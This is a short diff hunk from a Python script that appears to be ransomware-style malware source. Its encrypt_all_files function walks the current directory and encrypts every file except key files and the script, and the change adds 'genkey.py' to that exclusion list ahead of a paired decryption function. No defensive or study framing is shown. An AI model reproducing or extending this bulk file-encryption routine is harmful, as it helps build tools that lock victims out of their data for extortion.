@@ -60,7 +60,7 @@ def encrypt_all_files():
     for root, dirs, files in os.walk("."):
         for filename in files:
             file_path = os.path.join(root, filename)
-            if filename not in ["public_key.pem", "private_key.pem", "encrypted_fernet_key.key", script_name] and not filename.endswith(".enc"):
+            if filename not in ["public_key.pem", "private_key.pem", "encrypted_fernet_key.key","genkey.py" ,script_name] and not filename.endswith(".enc"):
                 encrypt_file(file_path, fernet)
 
 def decrypt_all_files():
